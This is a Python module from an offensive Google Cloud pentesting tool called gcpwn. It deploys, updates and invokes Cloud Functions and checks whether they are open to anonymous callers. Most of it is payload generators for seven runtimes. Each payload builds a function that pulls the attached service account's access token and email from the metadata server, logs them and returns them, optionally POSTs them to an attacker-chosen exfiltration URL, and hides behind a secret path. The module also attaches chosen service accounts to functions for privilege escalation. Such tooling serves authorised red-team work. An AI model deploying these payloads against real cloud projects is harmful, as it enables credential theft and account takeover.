from __future__ import annotations

import json
import re
import subprocess
import tempfile
import requests
from pathlib import Path
from urllib.parse import urlparse
from typing import Any, Dict, Optional, Union

from gcpwn.core.console import UtilityTools

# Typing libraries
from google.cloud.functions_v1 import CloudFunction
from google.cloud.functions_v2 import Function
from google.cloud.functions_v2 import FunctionServiceClient
from google.iam.v1.policy_pb2 import Policy
from google.iam.v1 import iam_policy_pb2
from google.cloud import storage

# Main GCP Libraries
from google.cloud import functions_v1
from google.cloud import functions_v2

# Error Codes
from google.api_core.exceptions import InvalidArgument

# Utilities
from gcpwn.core.utils.action_recording import record_permissions
from gcpwn.core.utils.iam_permissions import permissions_with_prefixes
from gcpwn.core.utils.module_helpers import (
    extract_location_from_resource_name,
    extract_path_segment,
    extract_project_id_from_resource,
    read_lines,
    resource_name_from_value,
    static_locations,
)
from gcpwn.core.utils.persistence import save_to_table
from gcpwn.core.utils.serialization import resource_to_dict
from gcpwn.core.utils.service_runtime import handle_service_error, parse_csv_arg

# Utility for regex checking
def check_format(value: str, pattern: str, label: str):
    if re.match(pattern, value):
        return 1
    else:
        print(f"[X] Input string does not follow the correct format. It should be in the format: {label}")
        return None

########### Save Operations for Objects

def _create_function(
        function_client: FunctionServiceClient,
        function_name: str,
        bucket_source: str,
        version: str,
        entry_point: str,
        sa: Optional[str] = None,
        debug: Optional[bool] = None,
        env_vars: Optional[Dict[str, str]] = None,
        runtime: str = "python314",
    ) -> Union[CloudFunction, Function, None]:
    """Deploy a new function (gen1 or gen2) from a GCS source archive; return the created function.

    PRIVESC: passing ``sa`` attaches a chosen service account to the function, so an attacker who
    can create functions can run code as that SA. Blocks until the long-running create op
    completes. Returns None on denial/disabled-API/error.
    """
    update_status = None
    project_id = extract_path_segment(function_name, "projects")
    region = extract_path_segment(function_name, "locations")
    function_id = extract_path_segment(function_name, "functions")
    parent = f"projects/{project_id}/locations/{region}" if project_id and region else ""

    if version == "1":

        try:

            fn = functions_v1.CloudFunction(
                source_archive_url=bucket_source,
                name=function_name,
                entry_point=entry_point,
                runtime=runtime,
                https_trigger=functions_v1.HttpsTrigger(),
            )
            if sa:
                fn.service_account_email = sa
            if env_vars:
                fn.environment_variables.update(env_vars)

            request = functions_v1.CreateFunctionRequest(
                location=parent,
                function=fn,
            )

            operation = function_client.create_function(request=request)

            print("[*] Waiting for V1 creation operation to complete, this might take some time...")

            response = operation.result()
            update_status = response
            print(f"[*] Successfully created {function_name}")

        except Exception as exc:
            handle_service_error(
                exc,
                api_name="cloudfunctions.functions.create [v1]",
                resource_name=function_name,
                service_label="Cloud Functions",
                project_id=project_id,
                return_not_enabled=False,
            )

    elif version == "2":

        try:

            parsed = urlparse(bucket_source)
            bucket_name = str(parsed.netloc or "").strip()
            object_path = str(parsed.path or "").lstrip("/")

            build_config = {
                "entry_point": entry_point,
                "runtime": runtime,
                "source": {
                    "storage_source": {
                        "bucket": bucket_name,
                        "object_": object_path
                    }
                }
            }

            function = {
                "name": function_name,
                "build_config": build_config,
                "environment": "GEN_2",
            }

            service_config: Dict[str, Any] = {}
            if sa:
                service_config["service_account_email"] = sa
            if env_vars:
                service_config["environment_variables"] = env_vars
            if service_config:
                function["service_config"] = service_config

            request = functions_v2.CreateFunctionRequest(
                parent=parent,
                function=function,
                function_id=function_id
            )

            operation = function_client.create_function(request=request)

            print("[*] Waiting for V2 creation operation to complete, this might take some time...")

            response = operation.result()
            update_status = response
            print(f"[*] Successfully created {function_name}")

        except Exception as exc:
            handle_service_error(
                exc,
                api_name="cloudfunctions.functions.create [v2]",
                resource_name=function_name,
                service_label="Cloud Functions",
                project_id=project_id,
                return_not_enabled=False,
            )

    return update_status

# Note add generate_upload_url option
def _update_function(
    function_client: FunctionServiceClient,
    function_name: str,
    bucket_source: str,
    version: str,
    entry_point: str,
    sa: Optional[str] = None,
    debug: Optional[bool] = None,
    env_vars: Optional[Dict[str, str]] = None,
    runtime: str = "python314",
) -> Union[Policy, None]:
    if debug:
        print(f"[*] Updating function {function_name}")

    update_status = None
    project_id = extract_path_segment(function_name, "projects")

    if version == "1":

        try:

            update_mask_fields = ["entryPoint", "sourceArchiveUrl", "runtime"]
            fn = functions_v1.CloudFunction(
                source_archive_url=bucket_source,
                name=function_name,
                entry_point=entry_point,
                runtime=runtime,
            )
            if sa:
                fn.service_account_email = sa
                update_mask_fields.append("serviceAccountEmail")
            if env_vars:
                fn.environment_variables.update(env_vars)
                update_mask_fields.append("environmentVariables")

            request = functions_v1.UpdateFunctionRequest(
                update_mask=",".join(update_mask_fields),
                function=fn,
            )

            operation = function_client.update_function(request=request)

            print("[*] Waiting for update operation on V1 to complete, this might take awhile...")

            response = operation.result()
            update_status = response
            print("[*] Successfully updated the function")

        except Exception as exc:
            handle_service_error(
                exc,
                api_name="cloudfunctions.functions.update [v1]",
                resource_name=function_name,
                service_label="Cloud Functions",
                project_id=project_id,
                return_not_enabled=False,
            )

    elif version == "2":

        try:

            parsed = urlparse(bucket_source)
            object_zip = str(parsed.path or "").lstrip("/")
            bucket = str(parsed.netloc or "").strip()

            build_config = {
                "entry_point": entry_point,
                "runtime": runtime,
                "source": {
                    "storage_source": {
                        "bucket": bucket,
                        "object_": object_zip
                    }
                }
            }

            function = {
                "name": function_name,
                "build_config": build_config
            }

            update_mask = "buildConfig.entryPoint,buildConfig.runtime,buildConfig.source.storageSource"
            service_config: Dict[str, Any] = {}
            if sa:
                service_config["service_account_email"] = sa
                update_mask += ",serviceConfig.serviceAccountEmail"
            if env_vars:
                service_config["environment_variables"] = env_vars
                update_mask += ",serviceConfig.environmentVariables"
            if service_config:
                function["service_config"] = service_config

            request = functions_v2.UpdateFunctionRequest(
                update_mask=update_mask,
                function=function
            )

            operation = function_client.update_function(request=request)
            print("[*] Waiting for update operation on V2 to complete, this might take awhile...")

            response = operation.result()
            update_status = response
            print("[*] Successfully updated the function")

        except Exception as exc:
            handle_service_error(
                exc,
                api_name="cloudfunctions.functions.update [v2]",
                resource_name=function_name,
                service_label="Cloud Functions",
                project_id=project_id,
                return_not_enabled=False,
            )

    return update_status


def _call_function(
        function_client_v1: FunctionServiceClient,
        function_name: str,
        version:str,
        auth_json: Optional[Dict] = None,
        debug: Optional[str] = False
    )-> Union[Policy, None]:
    """Invoke a function and return its response body; gen2 is hand-rolled over REST.

    gen1 uses the call_function client API. gen2 has no Python client, so this exchanges the
    supplied OAuth refresh-token creds (auth_json) for an id_token and POSTs to the function URL.
    Returns the response data, or -1 when gen2 creds/id_token are missing (prints guidance).
    """
    if debug:
        print(f"[*] Calling {function_name} [v{version}]...")

    response_data = None

    if version == "1":

        try:

            # Data does not matter since we are passing it in
            request = functions_v1.CallFunctionRequest(
                name=function_name,
                data="test"
            )
            response = function_client_v1.call_function(request=request)
            # Handle the response
            response_data = response.result

        except Exception as exc:
            handle_service_error(
                exc,
                api_name="cloudfunctions.functions.invoke [v1]",
                resource_name=function_name,
                service_label="Cloud Functions",
                project_id=function_name,
                return_not_enabled=False,
            )

    # Manual Build with REST APIs due to no API for V2 functions (Can't use V1 client)
    elif version == "2":
        fail_string = "[X] Cannot invoke V2 functions from the python libraries at the moment due to the need for an identity token. If you have access to the google account via a web browser, navigate to the function and go to 'testing'. Run the CLI test command in cloud shell if possible to get the email/token back. Once these are returned add via normal command line via 'creds add --type Oauth2 --token <token>"

        try:
            grant_type = "refresh_token"
            if "token_uri" in auth_json.keys():
                token_uri = auth_json["token_uri"]
            if "client_id" in auth_json.keys():
                client_id = auth_json["client_id"]
            if "client_secret" in auth_json.keys():
                client_secret = auth_json["client_secret"]
            if "refresh_token" in auth_json.keys():
                refresh_token = auth_json["refresh_token"]

            if not (token_uri and client_id and client_secret and refresh_token):
                print(fail_string)
                return -1

            else:

                arguments = {
                    "grant_type":grant_type,
                    "client_id":client_id,
                    "client_secret":client_secret,
                    "refresh_token":refresh_token
                }

                headers = {
                    "Content-Type": "application/x-www-form-urlencoded"
                }

                response = requests.post(token_uri, data=arguments, headers=headers)

                if response.status_code == 200:

                    response_json = json.loads(response.text)
                    if "id_token" in response_json.keys():
                        identity_token = response_json["id_token"]
                    else:
                        print(fail_string)
                        return -1

                    simple_name = extract_path_segment(function_name, "functions")
                    region = extract_path_segment(function_name, "locations")
                    project = extract_project_id_from_resource(function_name)


                    url = f"https://{region}-{project}.cloudfunctions.net/{simple_name}"

                    headers = {
                        'Authorization': f'bearer {identity_token}',
                        'Content-Type': 'application/json'
                    }

                    data = {
                        "name": "Hello World"
                    }

                    response = requests.post(url, headers=headers, data=json.dumps(data), timeout=70)
                    response_data = response.text


        except Exception as e:

            UtilityTools.print_500(project, "cloudfunctions.functions.invoke [v2 - custom]", e)

    if debug:
        print("[DEBUG] Successfully completed functions cloudfunctions.functions.invoke ..")

    return response_data


# ─── Runtime metadata ────────────────────────────────────────────────────────
# Maps runtime-ID prefix → (default entry point, V1 supported bool)
_RUNTIME_META: Dict[str, tuple] = {
    "python":  ("data_exfil",               True),
    "nodejs":  ("dataExfil",                True),
    "go":      ("DataExfil",                True),
    "java":    ("gcpwn.DataExfil",          True),
    "ruby":    ("dataExfil",                True),
    "php":     ("dataExfil",                False),  # V2 only
    "dotnet":  ("GcpwnFunctions.DataExfil", False),  # V2 only
}

# All known (non-deprecated) runtime IDs — ordered most-recent-first per language.
# Default for each language is the first entry.
SUPPORTED_RUNTIMES = [
    # Python — default: python314
    "python314", "python313", "python312", "python311", "python310",
    # Node.js — default: nodejs24 (nodejs26 is Preview)
    "nodejs24", "nodejs22", "nodejs20", "nodejs18", "nodejs26",
    # Go — default: go125 (go126 is Preview)
    "go125", "go124", "go123", "go122", "go121", "go126",
    # Java — default: java25
    "java25", "java21", "java17",
    # Ruby — default: ruby40
    "ruby40", "ruby34", "ruby33", "ruby32",
    # PHP (V2 only) — default: php85
    "php85", "php84", "php83", "php82",
    # .NET (V2 only) — default: dotnet10
    "dotnet10", "dotnet8",
]

# V1-compatible runtime IDs (V1 supports only older, non-PHP/dotnet runtimes)
_V1_RUNTIMES = {
    "python310", "python39", "python38", "python37",
    "nodejs18", "nodejs16", "nodejs14", "nodejs12", "nodejs10",
    "go120", "go119", "go118", "go116", "go113",
    "java11",
    "ruby30", "ruby27", "ruby26",
}


def _lang_from_runtime(runtime: str) -> str:
    for prefix in _RUNTIME_META:
        if runtime.startswith(prefix):
            return prefix
    return "python"


def _default_entry_point(runtime: str) -> str:
    return _RUNTIME_META.get(_lang_from_runtime(runtime), ("data_exfil", True))[0]


def _runtime_v1_ok(runtime: str) -> bool:
    lang = _lang_from_runtime(runtime)
    return _RUNTIME_META.get(lang, (None, False))[1] and runtime in _V1_RUNTIMES


# ─── Per-language payload builders ───────────────────────────────────────────

def _zip_from_files(files: Dict[str, str]) -> bytes:
    import io
    import zipfile as _zf
    buf = io.BytesIO()
    with _zf.ZipFile(buf, "w", _zf.ZIP_DEFLATED) as zf:
        for name, content in files.items():
            zf.writestr(name, content)
    return buf.getvalue()


def _python_payload(exfil_url: str = "", secret_path: str = "") -> Dict[str, str]:
    lines = [
        "import json, urllib.request",
        "_BASE = 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/'",
        "_HDR = {'Metadata-Flavor': 'Google'}",
        "_MARKER_TOKEN = 'GCPWN_CF_TOKEN='",
        "_MARKER_EMAIL = 'GCPWN_CF_EMAIL='",
    ]
    if exfil_url:
        lines.append("_EXFIL_URL = " + repr(exfil_url))
    if secret_path:
        lines.append("_SECRET_PATH = " + repr(secret_path))
    lines += ["", "def data_exfil(request):"]
    if secret_path:
        lines += [
            "    if request.path.split('?')[0] != _SECRET_PATH:",
            "        return ('', 404)",
        ]
    lines += [
        "    def _get(p):",
        "        req = urllib.request.Request(_BASE + p, headers=_HDR)",
        "        with urllib.request.urlopen(req, timeout=5) as r:",
        "            return r.read().decode()",
        "    try:",
        "        email = _get('email').strip()",
        "        tok = json.loads(_get('token'))",
        "        access_token = tok.get('access_token', '')",
        "        print(_MARKER_EMAIL + email, flush=True)",
        "        print(_MARKER_TOKEN + access_token, flush=True)",
    ]
    if exfil_url:
        lines += [
            "        body = json.dumps({'email': email, 'access_token': access_token}).encode()",
            "        cb = urllib.request.Request(",
            "            _EXFIL_URL, data=body,",
            "            headers={'Content-Type': 'application/json'}, method='POST'",
            "        )",
            "        try: urllib.request.urlopen(cb, timeout=10)",
            "        except Exception: pass",
        ]
    lines += [
        "        return {'email': email, 'access_token': access_token}",
        "    except Exception as exc:",
        "        return {'error': str(exc)}, 500",
    ]
    return {"main.py": "\n".join(lines)}


def _nodejs_payload(exfil_url: str = "", secret_path: str = "") -> Dict[str, str]:
    cb = repr(exfil_url) if exfil_url else None
    sp = repr(secret_path) if secret_path else None
    consts = ""
    if cb:
        consts += f"const _EXFIL_URL = {cb};\n"
    if sp:
        consts += f"const _SECRET_PATH = {sp};\n"
    path_check = ""
    if secret_path:
        path_check = (
            "  if (req.path !== _SECRET_PATH) { res.status(404).send('Not Found'); return; }\n"
        )
    callback_code = ""
    if exfil_url:
        callback_code = """\
  await new Promise((resolve) => {
    const body = JSON.stringify({email, access_token});
    const cu = new URL(_EXFIL_URL);
    const mod = cu.protocol === 'https:' ? require('https') : require('http');
    const opts = {
      hostname: cu.hostname, port: cu.port || (cu.protocol === 'https:' ? 443 : 80),
      path: cu.pathname + cu.search, method: 'POST',
      headers: {'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body)}
    };
    const r = mod.request(opts, resolve); r.on('error', resolve); r.write(body); r.end();
  });
"""
    index_js = f"""\
'use strict';
const http = require('http');
const MARKER_EMAIL = 'GCPWN_CF_EMAIL=';
const MARKER_TOKEN = 'GCPWN_CF_TOKEN=';
{consts}
function fetchMeta(path) {{
  return new Promise((resolve, reject) => {{
    const opts = {{
      hostname: 'metadata.google.internal',
      path: '/computeMetadata/v1/instance/service-accounts/default/' + path,
      headers: {{'Metadata-Flavor': 'Google'}}
    }};
    http.get(opts, (res) => {{ let d = ''; res.on('data', c => d += c); res.on('end', () => resolve(d)); }})
        .on('error', reject);
  }});
}}

exports.dataExfil = async (req, res) => {{
{path_check}\
  try {{
    const [tokenJson, emailRaw] = await Promise.all([fetchMeta('token'), fetchMeta('email')]);
    const token = JSON.parse(tokenJson);
    const access_token = token.access_token || '';
    const email = emailRaw.trim();
    console.log(MARKER_EMAIL + email);
    console.log(MARKER_TOKEN + access_token);
{callback_code}\
    res.json({{email, access_token}});
  }} catch (err) {{
    res.status(500).json({{error: err.message}});
  }}
}};
"""
    package_json = '{"main":"index.js"}'
    return {"index.js": index_js, "package.json": package_json}


def _go_payload(exfil_url: str = "", secret_path: str = "") -> Dict[str, str]:
    consts = ""
    if secret_path:
        consts += f'const _SECRET_PATH = {json.dumps(secret_path)}\n'
    if exfil_url:
        consts += f'const _EXFIL_URL = {json.dumps(exfil_url)}\n'
    path_check = ""
    if secret_path:
        path_check = '\tif r.URL.Path != _SECRET_PATH { http.NotFound(w, r); return }\n'
    callback_code = ""
    if exfil_url:
        callback_code = """\
\tbody2, _ := json.Marshal(map[string]string{"email": email, "access_token": accessToken})
\treq2, _ := http.NewRequest("POST", _EXFIL_URL, bytes.NewReader(body2))
\tif req2 != nil {
\t\treq2.Header.Set("Content-Type", "application/json")
\t\tresp2, err2 := httpClient.Do(req2)
\t\tif err2 == nil && resp2 != nil { resp2.Body.Close() }
\t}
"""
    imports = ['"encoding/json"', '"fmt"', '"io"', '"net/http"', '"strings"']
    if exfil_url:
        imports += ['"bytes"', '"crypto/tls"', '"time"']
    imports_str = "\n\t".join(imports)
    if exfil_url:
        http_client_decl = """\
var httpClient = &http.Client{
\tTimeout: 15 * time.Second,
\tTransport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}},
}"""
    else:
        http_client_decl = "var httpClient = &http.Client{Timeout: 10 * time.Second}"
        imports += ['"time"']
        imports_str = "\n\t".join(imports)
    function_go = f"""\
package p

import (
\t{imports_str}
)

{http_client_decl}
{consts}
func fetchMeta(path string) (string, error) {{
\treq, err := http.NewRequest("GET", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/"+path, nil)
\tif err != nil {{ return "", err }}
\treq.Header.Set("Metadata-Flavor", "Google")
\tresp, err := httpClient.Do(req)
\tif err != nil {{ return "", err }}
\tdefer resp.Body.Close()
\tb, err := io.ReadAll(resp.Body)
\treturn string(b), err
}}

func DataExfil(w http.ResponseWriter, r *http.Request) {{
{path_check}\
\ttokenJSON, err := fetchMeta("token")
\tif err != nil {{ http.Error(w, err.Error(), 500); return }}
\traw, _ := fetchMeta("email")
\temail := strings.TrimSpace(raw)
\tvar tokenData map[string]interface{{}}
\tjson.Unmarshal([]byte(tokenJSON), &tokenData)
\taccessToken, _ := tokenData["access_token"].(string)
\tfmt.Printf("GCPWN_CF_EMAIL=%s\\n", email)
\tfmt.Printf("GCPWN_CF_TOKEN=%s\\n", accessToken)
{callback_code}\
\tw.Header().Set("Content-Type", "application/json")
\tjson.NewEncoder(w).Encode(map[string]interface{{}}{{"email": email, "access_token": accessToken}})
}}
"""
    go_mod = "module gcpwn.local/cf\n\ngo 1.22\n"
    return {"function.go": function_go, "go.mod": go_mod}


def _java_payload(exfil_url: str = "", secret_path: str = "") -> Dict[str, str]:
    path_check = ""
    if secret_path:
        path_check = (
            f'        String reqPath = request.getPath();\n'
            f'        if (!{json.dumps(secret_path)}.equals(reqPath)) {{\n'
            f'            response.setStatusCode(404);\n'
            f'            return;\n'
            f'        }}\n'
        )
    callback_code = ""
    if exfil_url:
        callback_code = f"""\
        try {{
            URL cbUrl = new URL({json.dumps(exfil_url)});
            HttpURLConnection cbConn = (HttpURLConnection) cbUrl.openConnection();
            cbConn.setRequestMethod("POST");
            cbConn.setDoOutput(true);
            cbConn.setRequestProperty("Content-Type", "application/json");
            String cbBody = "{{\\"email\\":\\"" + email + "\\",\\"access_token\\":\\"" + accessToken + "\\"}}";
            cbConn.getOutputStream().write(cbBody.getBytes(StandardCharsets.UTF_8));
            cbConn.getResponseCode();
        }} catch (Exception ignored) {{}}
"""
    java_src = f"""\
package gcpwn;

import com.google.cloud.functions.HttpFunction;
import com.google.cloud.functions.HttpRequest;
import com.google.cloud.functions.HttpResponse;
import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;

public class DataExfil implements HttpFunction {{
    private static final String BASE =
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/";

    @Override
    public void service(HttpRequest request, HttpResponse response) throws Exception {{
{path_check}\
        String tokenJson = fetchMeta("token");
        String email = fetchMeta("email").trim();

        String accessToken = "";
        int i = tokenJson.indexOf("\\"access_token\\"");
        if (i >= 0) {{
            int s = tokenJson.indexOf('"', i + 15) + 1;
            int e = tokenJson.indexOf('"', s);
            if (s > 0 && e > s) accessToken = tokenJson.substring(s, e);
        }}

        System.out.println("GCPWN_CF_EMAIL=" + email);
        System.out.println("GCPWN_CF_TOKEN=" + accessToken);
{callback_code}\
        response.setContentType("application/json");
        response.getWriter().write("{{\\"email\\":\\"" + email +
            "\\",\\"access_token\\":\\"" + accessToken + "\\"}}");
    }}

    private String fetchMeta(String path) throws Exception {{
        URL url = new URL(BASE + path);
        HttpURLConnection c = (HttpURLConnection) url.openConnection();
        c.setRequestProperty("Metadata-Flavor", "Google");
        try (BufferedReader br = new BufferedReader(
                new InputStreamReader(c.getInputStream(), StandardCharsets.UTF_8))) {{
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) sb.append(line);
            return sb.toString();
        }}
    }}
}}
"""
    pom_xml = """\
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
  <modelVersion>4.0.0</modelVersion>
  <groupId>gcpwn</groupId>
  <artifactId>data-exfil</artifactId>
  <version>1.0.0</version>
  <properties>
    <maven.compiler.source>21</maven.compiler.source>
    <maven.compiler.target>21</maven.compiler.target>
  </properties>
  <dependencies>
    <dependency>
      <groupId>com.google.cloud.functions</groupId>
      <artifactId>functions-framework-api</artifactId>
      <version>1.1.0</version>
      <scope>provided</scope>
    </dependency>
  </dependencies>
</project>
"""
    return {"src/main/java/gcpwn/DataExfil.java": java_src, "pom.xml": pom_xml}


_RUBY_GEMFILE_LOCK_FALLBACK = """\
GEM
  remote: https://rubygems.org/
  specs:
    cloud_events (0.9.0)
    functions_framework (1.7.0)
      cloud_events (>= 0.7.0, < 2.a)
      puma (>= 4.3.0, < 9.a)
      rack (>= 2.1, < 4.a)
    logger (1.7.0)
    nio4r (2.7.5)
    puma (8.0.2)
      nio4r (~> 2.0)
    rack (3.2.6)

PLATFORMS
  ruby

DEPENDENCIES
  functions_framework
  logger

BUNDLED WITH
   2.6.7
"""


def _ruby_gemfile_lock(gemfile_content: str) -> str:
    try:
        with tempfile.TemporaryDirectory() as tmp:
            gf = Path(tmp) / "Gemfile"
            gf.write_text(gemfile_content, encoding="utf-8")
            result = subprocess.run(
                ["bundle", "lock"],
                cwd=tmp,
                capture_output=True,
                text=True,
                timeout=60,
            )
            lock_path = Path(tmp) / "Gemfile.lock"
            if result.returncode == 0 and lock_path.exists():
                return lock_path.read_text(encoding="utf-8")
    except Exception:
        pass
    return _RUBY_GEMFILE_LOCK_FALLBACK


def _ruby_payload(exfil_url: str = "", secret_path: str = "") -> Dict[str, str]:
    path_check = ""
    if secret_path:
        path_check = (
            f'  return [404, {{}}, ["Not Found"]] if request.path != {repr(secret_path)}\n'
        )
    callback_code = ""
    if exfil_url:
        callback_code = f"""\
  begin
    cb_uri = URI({repr(exfil_url)})
    cb_req = Net::HTTP::Post.new(cb_uri)
    cb_req["Content-Type"] = "application/json"
    cb_req.body = JSON.generate({{email: email, access_token: access_token}})
    Net::HTTP.start(cb_uri.hostname, cb_uri.port, use_ssl: cb_uri.scheme == "https") {{ |h| h.request(cb_req) }}
  rescue StandardError
  end
"""
    app_rb = f"""\
require "functions_framework"
require "net/http"
require "json"
require "uri"

BASE = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/"
MARKER_EMAIL = "GCPWN_CF_EMAIL="
MARKER_TOKEN = "GCPWN_CF_TOKEN="

def fetch_meta(path)
  uri = URI(BASE + path)
  req = Net::HTTP::Get.new(uri)
  req["Metadata-Flavor"] = "Google"
  Net::HTTP.start(uri.hostname, uri.port) {{ |http| http.request(req) }}.body
end

FunctionsFramework.http "dataExfil" do |request|
{path_check}\
  begin
    token_data = JSON.parse(fetch_meta("token"))
    access_token = token_data["access_token"] || ""
    email = fetch_meta("email").strip
    $stdout.puts MARKER_EMAIL + email
    $stdout.puts MARKER_TOKEN + access_token
    $stdout.flush
{callback_code}\
    [200, {{"Content-Type" => "application/json"}},
     [JSON.generate({{email: email, access_token: access_token}})]]
  rescue => e
    [500, {{"Content-Type" => "application/json"}}, [JSON.generate({{error: e.message}})]]
  end
end
"""
    gemfile = 'source "https://rubygems.org"\ngem "functions_framework"\ngem "logger"\n'
    gemfile_lock = _ruby_gemfile_lock(gemfile)
    return {"app.rb": app_rb, "Gemfile": gemfile, "Gemfile.lock": gemfile_lock}


def _php_payload(exfil_url: str = "", secret_path: str = "") -> Dict[str, str]:
    path_check = ""
    if secret_path:
        path_check = (
            f'    $reqPath = $request->getUri()->getPath();\n'
            f'    if ($reqPath !== {repr(secret_path)}) {{\n'
            f'        return new \\GuzzleHttp\\Psr7\\Response(404);\n'
            f'    }}\n'
        )
    callback_code = ""
    if exfil_url:
        callback_code = f"""\
    try {{
        $cbBody = json_encode(['email' => $email, 'access_token' => $accessToken]);
        $cbOpts = ['http' => ['method' => 'POST', 'header' => "Content-Type: application/json\\r\\n", 'content' => $cbBody]];
        @file_get_contents({repr(exfil_url)}, false, stream_context_create($cbOpts));
    }} catch (\\Exception $ignored) {{}}
"""
    index_php = f"""\
<?php
use Google\\CloudFunctions\\FunctionsFramework;
use Psr\\Http\\Message\\ServerRequestInterface;

FunctionsFramework::http('dataExfil', 'dataExfil');

function fetchMeta(string $path): string {{
    $opts = ['http' => ['header' => "Metadata-Flavor: Google\\r\\n"]];
    return (string) file_get_contents(
        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/' . $path,
        false, stream_context_create($opts)
    );
}}

function dataExfil(ServerRequestInterface $request): string {{
{path_check}\
    $tokenData = json_decode(fetchMeta('token'), true);
    $accessToken = $tokenData['access_token'] ?? '';
    $email = trim(fetchMeta('email'));
    error_log('GCPWN_CF_EMAIL=' . $email);
    error_log('GCPWN_CF_TOKEN=' . $accessToken);
{callback_code}\
    header('Content-Type: application/json');
    return json_encode(['email' => $email, 'access_token' => $accessToken]);
}}
"""
    composer = '{"require":{"google/cloud-functions-framework":"^1.2"}}'
    return {"index.php": index_php, "composer.json": composer}


def _dotnet_payload(exfil_url: str = "", secret_path: str = "", runtime: str = "dotnet10") -> Dict[str, str]:
    # dotnet10 → net10.0, dotnet8 → net8.0
    ver = runtime.replace("dotnet", "")
    tfm = f"net{ver}.0"
    path_check = ""
    if secret_path:
        path_check = (
            f'        if (context.Request.Path != {json.dumps(secret_path)}) {{\n'
            f'            context.Response.StatusCode = 404; return;\n'
            f'        }}\n'
        )
    callback_code = ""
    if exfil_url:
        callback_code = f"""\
        try {{
            using var cbReq = new HttpRequestMessage(HttpMethod.Post, {json.dumps(exfil_url)});
            cbReq.Content = JsonContent.Create(new {{ email, access_token = accessToken }});
            await Client.SendAsync(cbReq);
        }} catch {{ }}
"""
    cs = f"""\
using Google.Cloud.Functions.Framework;
using Microsoft.AspNetCore.Http;
using System;
using System.Net.Http;
using System.Net.Http.Json;
using System.Text.Json;
using System.Threading.Tasks;

namespace GcpwnFunctions;

public class DataExfil : IHttpFunction
{{
    private static readonly HttpClient Client = new();
    private const string Base = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/";

    public async Task HandleAsync(HttpContext context)
    {{
{path_check}\
        var tokenResp = await FetchMeta("token");
        var email = (await FetchMeta("email")).Trim();
        using var doc = JsonDocument.Parse(tokenResp);
        var accessToken = doc.RootElement.GetProperty("access_token").GetString() ?? "";
        Console.WriteLine($"GCPWN_CF_EMAIL={{email}}");
        Console.WriteLine($"GCPWN_CF_TOKEN={{accessToken}}");
{callback_code}\
        context.Response.ContentType = "application/json";
        await context.Response.WriteAsJsonAsync(new {{ email, access_token = accessToken }});
    }}

    private async Task<string> FetchMeta(string path)
    {{
        using var req = new HttpRequestMessage(HttpMethod.Get, Base + path);
        req.Headers.Add("Metadata-Flavor", "Google");
        var resp = await Client.SendAsync(req);
        return await resp.Content.ReadAsStringAsync();
    }}
}}
"""
    csproj = f"""\
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>{tfm}</TargetFramework>
    <Nullable>enable</Nullable>
  </PropertyGroup>
  <ItemGroup>
    <PackageReference Include="Google.Cloud.Functions.Hosting" Version="*" />
  </ItemGroup>
</Project>
"""
    return {"Function.cs": cs, "DataExfil.csproj": csproj}


def _build_payload_zip(exfil_url: str = "", secret_path: str = "", runtime: str = "python314") -> bytes:
    lang = _lang_from_runtime(runtime)
    builders: Dict[str, Any] = {
        "python": _python_payload,
        "nodejs": _nodejs_payload,
        "go":     _go_payload,
        "java":   _java_payload,
        "ruby":   _ruby_payload,
        "php":    _php_payload,
        "dotnet": _dotnet_payload,
    }
    if lang == "dotnet":
        files = _dotnet_payload(exfil_url=exfil_url, secret_path=secret_path, runtime=runtime)
    else:
        files = builders.get(lang, _python_payload)(exfil_url=exfil_url, secret_path=secret_path)
    return _zip_from_files(files)


# Mirroring check_bucket_existence from Rhino Security: https://github.com/RhinoSecurityLabs/GCPBucketBrute
def check_anonymous_external(
        function_name: Optional[str] = None,
        function_url: Optional[str] = None,
        printout: Optional[bool] = False,
        debug: Optional[bool] = False
    ):
    """Probe whether a function's HTTPS endpoint is invocable by anonymous (allUsers) callers.

    Derives the public cloudfunctions.net URL from the resource name when no URL is given, then
    does an unauthenticated GET. A non-4xx response lacking the GCP permission-denied marker means
    the function is publicly reachable. Returns True if anonymously accessible.
    """
    if debug:
        print(f"[DEBUG] Checking {function_url}")

    if not function_url:
        project = extract_project_id_from_resource(function_name)
        location = extract_path_segment(function_name, "locations")
        name = extract_path_segment(function_name, "functions")

        function_url = f"https://{location}-{project}.cloudfunctions.net/{name}"

    response = requests.get(function_url, timeout=10)

    if response.status_code not in [400, 401, 404] and "Your client does not have permission to get" not in response.text:
        if printout:
            print(f"[*] Function {function_url} is available to anonymous users")
        return True

    if debug:
        print(f"[DEBUG] Function {function_url} returned {response.status_code}. Does not exist.")

    return False

def list_functions(
        function_client: FunctionServiceClient,
        parent: str,
        debug: Optional[bool] = False
    ):
    """List functions (gen1+gen2) under a project/location parent via the v2 client.

    Returns the list on success, the sentinel "Not Enabled" when the API is disabled (to
    short-circuit region fan-out), or None on denial/404/error.
    """
    if debug:
        print(f"[DEBUG] Listing functions for project {parent} ...")

    function_list = []

    try:

        request = functions_v2.ListFunctionsRequest(
            parent=parent
        )

        function_list = list(function_client.list_functions(request=request))

    except Exception as exc:
        result = handle_service_error(
            exc,
            api_name="cloudfunctions.functions.list",
            resource_name=extract_project_id_from_resource(parent),
            service_label="Cloud Functions",
            project_id=extract_project_id_from_resource(parent),
        )
        return "Not Enabled" if result == "Not Enabled" else None

    if debug:
        print(f"[DEBUG] Successfully called list_functions for {parent} ...")

    return function_list

def get_function(
        function_client: FunctionServiceClient,
        function_name: str,
        debug: Optional[bool] = False
    ):
    """Fetch a single function's metadata via the v2 client; returns the function or None."""
    if debug:
